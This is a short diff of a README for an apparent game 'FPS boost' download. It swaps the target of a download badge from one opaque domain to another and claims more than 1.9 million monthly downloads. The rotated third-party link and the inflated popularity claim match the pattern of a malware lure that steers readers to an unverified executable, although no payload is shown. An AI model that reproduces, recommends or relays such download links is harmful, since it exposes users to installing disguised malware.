@@ -49,7 +49,7 @@ A: Yes — custom NVIDIA Control Panel and AMD profiles.
 
 **Monthly downloads:** 1.9m+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valfpsboost)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://p-csx-5.com/valfpsboost)
 
 ---
 
